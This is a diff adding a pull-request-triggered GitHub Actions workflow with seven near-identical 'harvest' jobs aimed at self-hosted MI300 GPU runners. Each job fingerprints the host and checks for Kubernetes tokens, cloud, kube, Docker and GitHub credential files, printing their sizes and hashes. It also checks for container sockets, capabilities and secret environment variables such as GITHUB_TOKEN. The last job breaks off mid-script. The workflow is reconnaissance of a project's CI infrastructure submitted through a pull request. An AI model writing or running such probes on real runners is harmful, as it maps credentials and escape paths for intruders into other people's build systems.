@@ -1,0 +1,1687 @@
+name: c211-127264-mi300x8q
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  job-mi300x8-01:
+    name: harvest-01
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-01 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-01 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-01 nonce=$NONCE"
+          exit 0
+  job-mi300x8-02:
+    name: harvest-02
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-02 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-02 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-02 nonce=$NONCE"
+          exit 0
+  job-mi300x8-03:
+    name: harvest-03
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-03 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-03 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-03 nonce=$NONCE"
+          exit 0
+  job-mi300x8-04:
+    name: harvest-04
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-04 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-04 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-04 nonce=$NONCE"
+          exit 0
+  job-mi300x8-05:
+    name: harvest-05
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-05 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-05 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-05 nonce=$NONCE"
+          exit 0
+  job-mi300x8-06:
+    name: harvest-06
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-06 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-06 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-06 nonce=$NONCE"
+          exit 0
+  job-mi300x8-07:
+    name: harvest-07
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-07 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-07 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
